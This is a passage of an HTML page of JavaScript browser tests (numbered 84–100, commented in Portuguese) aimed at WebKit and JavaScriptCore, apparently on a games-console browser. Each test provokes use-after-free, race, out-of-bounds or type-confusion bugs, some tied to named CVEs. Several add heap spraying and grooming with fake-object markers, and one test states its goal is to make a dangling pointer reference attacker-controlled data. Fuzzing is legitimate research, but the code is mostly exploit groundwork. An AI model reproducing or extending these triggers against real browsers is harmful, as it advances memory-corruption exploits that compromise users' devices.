                // Adotamos o marquee em execução para o documento morto
                deadDoc.adoptNode(marquee);
                
                // Destruímos o documento morto enquanto o Timer do WebCore ainda tenta 'ticar'
                deadDoc = null;
                marquee = null;
                
                // Spray massivo para realocar a memória que o Timer pode tentar acessar
                let spray = [];
                for(let i = 0; i < 5000; i++) spray.push(new ArrayBuffer(128));
            } catch(e) {}
            logMsg("Fim do Teste 84.");
        }

        // Teste 85: CSS Transition Event Race
        // Quando uma transição termina, o C++ dispara um evento para o JS.
        // Se, no exato microsegundo desse evento, destruirmos o nó pai, as rotinas de limpeza
        // da árvore de animação do WebKit (AnimationTimeline) podem entrar em colapso.
        function test85() {
            logMsg("Iniciando Teste 85 (Transition Event Race)...");
            try {
                let parent = document.createElement("div");
                let child = document.createElement("div");
                child.className = "fuzz-transition";
                parent.appendChild(child);
                document.body.appendChild(parent);
                
                // Forçamos o layout inicial
                let layout1 = child.offsetWidth;
                
                child.addEventListener("transitionrun", () => {
                    // Assim que a transição entra no loop de eventos do C++, nós apagamos a raiz
                    parent.remove();
                });
                
                // Dispara a transição alterando a propriedade
                child.style.width = "200px";
            } catch(e) {}
            logMsg("Fim do Teste 85.");
        }
// Teste 86: CSS Font Feature Iterator Race (Foco na CVE-2026-2441)
        // O motor CSS processa iterativamente regras de fontes avançadas.
        // Alterar essas regras via CSSOM (Object Model) e destruir o nó de estilo
        // no meio do processamento invalida o ponteiro do iterador C++.
        function test86() {
            logMsg("Iniciando Teste 86 (CSS Font Feature Iterator)...");
            try {
                let style = document.createElement("style");
                document.head.appendChild(style);
                
                // Injeta uma regra complexa que exige processamento de mapa
                style.sheet.insertRule(`@font-feature-values FuzzFont { @swash { fancy: 1; } }`, 0);
                
                let div = document.createElement("div");
                div.style.fontFamily = "FuzzFont";
                document.body.appendChild(div);
                
                // Forçamos o WebCore a iterar as regras para calcular o estilo
                let forceCalc = window.getComputedStyle(div).fontFamily;
                
                // Excluímos a regra do mapa nativo e removemos a folha de estilo da memória
                style.sheet.deleteRule(0);
                style.remove();
                
                // Tentamos forçar uma nova renderização imediata com os ponteiros recém-invalidados
                div.style.fontVariantAlternates = "swash(fancy)";
            } catch(e) {}
            logMsg("Fim do Teste 86.");
        }

        // Teste 87: HTML Parser Reentrancy UAF (Foco na CVE-2025-43529)
        // O parser C++ constrói a árvore DOM ao ler innerHTML.
        // Se um nó disparar um evento síncrono (como o onerror de uma imagem quebrada)
        // e esse evento destruir o elemento pai, o parser continuará operando em memória liberada.
        function test87() {
            logMsg("Iniciando Teste 87 (HTML Parser Reentrancy)...");
            try {
                let container = document.createElement("div");
                document.body.appendChild(container);
                
                // Ocultamos a execução do script no evento nativo
                // Quando a imagem falhar ao carregar, o contêiner será obliterado
                container.innerHTML = `<img src="fuzz_invalid.jpg" onerror="this.parentNode.remove(); new Array(2000).fill(new String('A').repeat(100));"><span>Limbo</span>`;
                
                // O WebKit ainda tentará anexar o "<span>Limbo</span>" ao contêiner que acabou de ser destruído pelo evento síncrono.
            } catch(e) {}
            logMsg("Fim do Teste 87.");
        }

        // Teste 88: JSC Butterfly Reallocation OOB
        // Manipula a estrutura fundamental de matrizes do JavaScriptCore.
        // Array.prototype.reduce itera nativamente em C++. Encolher o array e realocá-lo
        // em um índice distante dentro do callback força o deslocamento do ponteiro Butterfly.
        function test88() {
            logMsg("Iniciando Teste 88 (JSC Butterfly OOB)...");
            try {
                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
                
                arr.reduce(function(acc, val, idx) {
                    if (idx === 1) {
                        // Truncamos a matriz, forçando o C++ a liberar a alocação inline
                        arr.length = 0;
                        
                        // Recriamos o array em um índice absurdo para expandir a Asa Direita da Butterfly
                        arr[1000] = 9.9;
                        
                        // Forçamos o fastMalloc a preencher a memória livre
                        let spray = new Array(500).fill({ fakeObj: 0x41414141 });
                    }
                    return acc + val;
                }, 0);
            } catch(e) {}
            logMsg("Fim do Teste 88.");
        }

        // Teste 89: SVG Animation Timer UAF
        // A tag <animate> inicia rotinas e temporizadores assíncronos no motor gráfico isolado do SVG.
        // Se a raiz SVG for coletada pelo lixo enquanto uma animação dispara atualizações de DOM,
        // obtemos condições clássicas de Race e UAF.
        function test89() {
            logMsg("Iniciando Teste 89 (SVG Animation UAF)...");
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
                let animate = document.createElementNS("http://www.w3.org/2000/svg", "animate");
                
                animate.setAttribute("attributeName", "width");
                animate.setAttribute("from", "10");
                animate.setAttribute("to", "100");
                animate.setAttribute("dur", "0.1s");
                
                rect.appendChild(animate);
                svg.appendChild(rect);
                document.body.appendChild(svg);
                
                // Assim que a animação começar no C++, nós apagamos a estrutura base
                animate.addEventListener("beginEvent", function() {
                    svg.remove();
                    svg = null;
                });
            } catch(e) {}
            logMsg("Fim do Teste 89.");
        }

        // Teste 90: Event Listener Dangling Pointer (Foco na CVE-2025-43529)
        // Réplica direta do cenário descrito no relatório: "Se um manipulador de evento
        // mantiver um ponteiro pendurado para a região desocupada, o invasor orquestra a subversão."
        function test90() {
            logMsg("Iniciando Teste 90 (Dangling Pointer em Microtask)...");
            try {
                let btn = document.createElement("button");
                btn.innerText = "Fuzz";
                document.body.appendChild(btn);
                
                btn.addEventListener("click", function(e) {
                    let targetRef = e.currentTarget; // Captura o ponteiro no JS
                    
                    // Libera o objeto do DOM nativo
                    targetRef.remove();
                    
                    // Spray para tentar sobrescrever a classe C++ na memória
                    let spray = new Array(3000).fill(new Uint32Array(1024));
                    
                    // Joga a execução para o final do event loop (microtask)
                    Promise.resolve().then(() => {
                        // Tenta acessar métodos virtuais (vtable) do objeto que já deveria estar morto no C++
                        targetRef.setAttribute("fuzz", "dangling");
                        let leak = targetRef.innerHTML;
                    });
                });
                
                // Aciona o fluxo
                btn.click();
            } catch(e) {}
            logMsg("Fim do Teste 90.");
        }
// Teste 91: MediaSource Buffer UAF
        // A API MediaSource interage profundamente com o decodificador nativo de mídia do FreeBSD/Orbis OS.
        // Adicionar um buffer e destruir o objeto pai durante a operação assíncrona causa colapso de ponteiros.
        function test91() {
            logMsg("Iniciando Teste 91 (MediaSource Buffer UAF)...");
            try {
                let ms = new MediaSource();
                let video = document.createElement('video');
                video.src = URL.createObjectURL(ms);
                document.body.appendChild(video);
                
                ms.addEventListener('sourceopen', function() {
                    // O C++ preparou a estrutura, criamos o buffer de vídeo
                    let buffer = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
                    
                    // Iniciamos a cópia assíncrona de memória
                    buffer.appendBuffer(new ArrayBuffer(1024));
                    
                    // No meio da operação da thread de mídia, nós destruímos a raiz
                    video.remove();
                    ms = null;
                    
                    // Tentamos realocar o buraco deixado pelo buffer no Heap
                    let spray = new Array(5000).fill(new String("MSE_UAF").repeat(256));
                });
            } catch(e) {}
            logMsg("Fim do Teste 91.");
        }

        // Teste 92: DocumentType Replacement OOB
        // Os nós de DocumentType são tratados de forma especial pelo motor C++ (eles não são Elementos comuns).
        // Substituir e remover esses nós de forma cruzada engana o gerenciador de memória da árvore.
        function test92() {
            logMsg("Iniciando Teste 92 (DocumentType Replacement)...");
            try {
                let dt1 = document.implementation.createDocumentType("html", "", "");
                let dt2 = document.implementation.createDocumentType("xml", "", "");
                let doc = document.implementation.createDocument("http://www.w3.org/1999/xhtml", "html", dt1);
                
                // Rotina nativa de substituição no C++
                doc.replaceChild(dt2, dt1);
                
                // Remove o doctype original que agora não possui mais um documento pai válido
                dt1.remove(); 
                
                // Tentativa de interagir com o objeto recém invalidado
                let leak = dt1.name;
            } catch(e) {}
            logMsg("Fim do Teste 92.");
        }

        // Teste 93: Details/Summary Cascade UAF
        // Aninhar elementos details exige que o WebCore re-calcule o layout de toda a cadeia quando um é aberto.
        // Acionar a abertura e destruir a raiz durante a resolução despista o iterador de layout.
        function test93() {
            logMsg("Iniciando Teste 93 (Details Cascade UAF)...");
            try {
                let parentDetails = document.createElement('details');
                let childDetails = document.createElement('details');
                parentDetails.appendChild(childDetails);
                document.body.appendChild(parentDetails);
                
                childDetails.addEventListener('toggle', () => {
                    // A máquina de estado nativa disparou, nós deletamos a raiz
                    parentDetails.remove();
                });
                
                // Dispara o cálculo
                childDetails.open = true;
            } catch(e) {}
            logMsg("Fim do Teste 93.");
        }

        // Teste 94: VTTCueList Active Cues Race
        // O gerenciador de legendas precisa atualizar um array nativo de "legendas ativas" (activeCues).
        // Forçar o tempo do vídeo para um ponto onde múltiplas legendas se sobrepõem e deletar a faixa
        // causa dessincronização no array de ponteiros C++.
        function test94() {
            logMsg("Iniciando Teste 94 (VTTCueList Active Race)...");
            try {
                let video = document.createElement('video');
                let track = video.addTextTrack("subtitles", "fuzz", "en");
                track.mode = "showing"; // Força o C++ a renderizar as legendas na tela
                
                let cue1 = new VTTCue(0, 10, "Fuzz 1");
                let cue2 = new VTTCue(0, 10, "Fuzz 2"); // Sobreposição exata de tempo
                track.addCue(cue1);
                track.addCue(cue2);
                document.body.appendChild(video);
                
                // Forçamos o motor a avaliar as legendas simultâneas
                video.currentTime = 5;
                
                // Imediatamente extraímos uma legenda e obliteramos o reprodutor
                track.removeCue(cue1);
                video.remove();
                
                // A cue1 ainda tem referências no JS, mas a track no backend pode já ter corrompido sua lista
                let leak = cue1.text;
            } catch(e) {}
            logMsg("Fim do Teste 94.");
        }

        // Teste 95: Cross-Document Selection Amputation
        // O objeto de seleção do WebKit pode abranger nós de documentos diferentes (como dentro e fora de um iframe).
        // Destruir um desses documentos enquanto a seleção os conecta causa uma falha de limites e ponteiros fantasmas.
        function test95() {
            logMsg("Iniciando Teste 95 (Cross-Document Selection)...");
            try {
                let iframe = document.createElement('iframe');
                document.body.appendChild(iframe);
                
                let nodeOutside = document.createElement('span'); 
                nodeOutside.innerText = "Fora";
                document.body.appendChild(nodeOutside);
                
                let nodeInside = document.createElement('span'); 
                nodeInside.innerText = "Dentro";
                iframe.contentDocument.body.appendChild(nodeInside);
                
                let sel = window.getSelection();
                
                // O motor C++ cria uma estrutura ligando o nó do documento principal ao do iframe
                sel.setBaseAndExtent(nodeOutside, 0, nodeInside, 1);
                
                // Amputamos o iframe (e seu documento associado)
                iframe.remove();
                
                // Tentamos forçar a seleção nativa a recalcular sua posição atual usando o limbo
                sel.modify("move", "forward", "character");
            } catch(e) {}
            logMsg("Fim do Teste 95.");
        }
 // Teste 96: Heap Grooming e SVG UAF
        // Demonstra como alinhamos a memória (spraying) antes e depois da liberação
        // para garantir que o ponteiro fantasma aponte para dados controlados (FakeObj).
        function test96() {
            logMsg("Iniciando Teste 96 (Heap Grooming + UAF)...");
            try {
                // FASE 1: Grooming inicial para "limpar" buracos de memória
                let preGroom = [];
                for(let i=0; i<5000; i++) preGroom.push(new ArrayBuffer(1024));

                // FASE 2: Criamos o alvo que será corrompido
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
                svg.appendChild(g);
                document.body.appendChild(svg);
                
                // Disparamos um evento mutante no grupo SVG
                g.addEventListener("DOMNodeRemoved", function() {
                    // FASE 3: No momento da destruição, pulverizamos o Heap (Spraying)
                    // com o tamanho exato da estrutura em C++ do nó destruído.
                    let spray = [];
                    // 0x41414141 simula nosso objeto falso (FakeObj)
                    let fakeData = new Uint32Array(256).fill(0x41414141); 
                    for(let i=0; i<10000; i++) spray.push(fakeData.slice());
                });
                
                // Gatilho: Remove o nó, ativando o callback e a pulverização
                g.remove();
            } catch(e) {}
            logMsg("Fim do Teste 96.");
        }

        // Teste 97: MutationRecord Queue UAF
        // O WebCore armazena as mutações em uma fila nativa (queue) antes de entregá-las ao JS.
        // Mutar massivamente, desconectar e destruir os nós base antes da leitura
        // pode deixar a fila nativa repleta de ponteiros inválidos.
        function test97() {
            logMsg("Iniciando Teste 97 (MutationRecord Queue)...");
            try {
                let div = document.createElement("div");
                document.body.appendChild(div);
                
                let obs = new MutationObserver(() => {});
                obs.observe(div, { attributes: true, childList: true });
                
                // Enche a fila do C++ de registros pendentes
                for(let i=0; i<50; i++) div.setAttribute("fuzz", i);
                
                // Desconecta o observer (pausando a entrega) e amputa a árvore
                obs.disconnect();
                div.remove();
                
                // Tenta extrair manualmente os registros órfãos que apontam para o nó destruído
                let records = obs.takeRecords();
            } catch(e) {}
            logMsg("Fim do Teste 97.");
        }

        // Teste 98: IndexedDB Transaction Race
        // O banco de dados do navegador roda em um processo/thread separado do WebCore principal.
        // Interromper transações síncronas apagando a requisição IDB e chamando GC 
        // gera um Race Condition clássico no backend assíncrono.
        function test98() {
            logMsg("Iniciando Teste 98 (IndexedDB Race)...");
            try {
                let request = indexedDB.open("FuzzDB", 1);
                
                request.onupgradeneeded = function(e) {
                    let db = e.target.result;
                    let store = db.createObjectStore("fuzzStore");
                    store.add({ data: "payload".repeat(1000) }, 1);
                    
                    // Aborta brutalmente a transação do banco e fecha a conexão do C++
                    e.target.transaction.abort();
                    db.close();
                    
                    // Remove a referência do JS para forçar coleta imediata da requisição
                    request = null;
                };
            } catch(e) {}
            logMsg("Fim do Teste 98.");
        }

        // Teste 99: Range Boundary Comparison OOB
        // As comparações de limite de Range executam cálculos rápidos de hierarquia no DOM C++.
        // Ao interceptar essa comparação ou alimentar nós recém-desconectados, forçamos o motor
        // a ler as profundidades da árvore a partir do "null".
        function test99() {
            logMsg("Iniciando Teste 99 (Range Boundary OOB)...");
            try {
                let parent = document.createElement("div");
                let child1 = document.createElement("span");
                let child2 = document.createElement("span");
                parent.appendChild(child1);
                parent.appendChild(child2);
                document.body.appendChild(parent);
                
                let range1 = document.createRange();
                let range2 = document.createRange();
                range1.setStart(child1, 0);
                range2.setStart(child2, 0);
                
                // Desconectamos o nó 2 do documento, tornando-o órfão
                child2.remove();
                
                // Forçamos o cálculo nativo C++ entre um nó ancorado e um nó órfão invisível
                let leak = range1.compareBoundaryPoints(Range.START_TO_START, range2);
            } catch(e) {}
            logMsg("Fim do Teste 99.");
        }

        // Teste 100: Proxy Concat Type Confusion (Butterfly Structure)
        // Array.prototype.concat() lê a estrutura iterativamente.
        // Passar um Proxy injetado com um getter malicioso permite alterar 
        // a propriedade central do array durante a concatenação nativa em C++.
        function test100() {
            logMsg("Iniciando Teste 100 (Proxy Concat Type Confusion)...");
            try {
                let baseArray = [1.1, 2.2, 3.3]; // Array de pontos flutuantes duplo (Double)
                
                // Proxy que intercepta o C++ lendo o índice 1
                let proxy = new Proxy(baseArray, {
                    get: function(target, prop) {
                        if (prop === '1') {
                            // Quando o C++ chegar aqui, convertemos o array nativo 
                            // de "Double" para "Objeto Complexo" empurrando uma string
                            target[2] = { fuzz: "muta a estrutura borboleta" };
                        }
                        return target[prop];
                    }
                });
                
                // Gatilho: O C++ inicia a concatenação achando que lidará com Float64,
                // mas no meio do caminho a borboleta sofre transição de tipo.
                let result = Array.prototype.concat.call([], proxy);
            } catch(e) {}
            logMsg("Fim do Teste 100.");
        }
    </script>
</body>
</html>
